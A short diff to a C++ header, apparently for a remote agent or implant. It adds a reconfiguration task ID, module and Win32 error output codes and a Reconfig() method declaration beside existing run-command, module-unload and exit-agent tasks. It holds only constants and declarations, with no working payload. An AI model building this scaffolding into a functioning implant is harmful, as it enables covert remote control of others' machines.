@@ -39,12 +39,16 @@
 #define TASK_RUN_CMD       0xb3
 #define TASK_UNLOAD_MODULE 0xb4
 #define TASK_EXIT_AGENT    0xb5
+#define TASK_RECONFIG      0xb6
 
 // Output IDs
 #define OUTPUT_NO_PARSE    0xc1
 #define OUTPUT_NEEDS_PARSE 0xc2
 #define OUTPUT_SUCCESS     0xc3
 #define OUTPUT_ERROR       0xc4
+#define OUTPUT_MODULE_SUCCESS 0xc5
+#define OUTPUT_MODULE_ERROR   0xc6
+#define OUTPUT_WIN32_ERROR    0xc7
 
 // Parser IDs carried by OUTPUT_NEEDS_PARSE
 #define PARSE_MODULE_BITS 101
@@ -60,6 +64,7 @@
 #define TASK_SUCCESS_NO_OUTPUT 0xf3
 #define SUCCESS_MODULE_LOAD 0xb1
 #define SUCCESS_MODULE_UNLOAD 0xb5
+#define RECONFIG_SUCCESS      0xb4
 
 
 #define DECL( x ) decltype( x ) * x
@@ -76,6 +81,7 @@ private:
 	void exitAgent( );
 	void Cleanup( );
 	void Sleeper( );
+	void Reconfig( );
 
 public:
 	struct Apis {
